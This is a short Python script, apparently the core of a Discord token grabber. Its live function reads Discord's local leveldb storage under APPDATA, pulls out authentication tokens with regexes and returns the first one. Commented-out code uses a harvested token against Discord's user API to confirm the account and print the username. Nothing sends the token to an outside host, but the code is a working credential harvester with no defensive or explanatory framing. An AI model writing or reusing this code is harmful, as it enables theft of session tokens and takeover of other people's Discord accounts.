import os
import re
import requests
# def find_tokens(path):
#     path += '\\Local Storage\\leveldb'

#     tokens = []

#     for file_name in os.listdir(path):
#         if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
#             continue

#         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
#             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
#                 for token in re.findall(regex, line):
#                     tokens.append(token)
#     return tokens
def get_token():
    roaming = os.getenv('APPDATA')
    path=roaming+'\\Discord\\Local Storage\\leveldb'
    # path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens[0]
# print(get_token())
# roaming = os.getenv('APPDATA')
# path=roaming+'\\Discord'
# tokens = find_tokens(path)
# print(tokens)

# headers = {
#     'Authorization': tokens[1]
# }
# response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
# print(response.status_code)
# if response.status_code == 200:
#     user_data = response.json()
#     username = user_data['username']
#     print(f'Имя пользователя: {username}')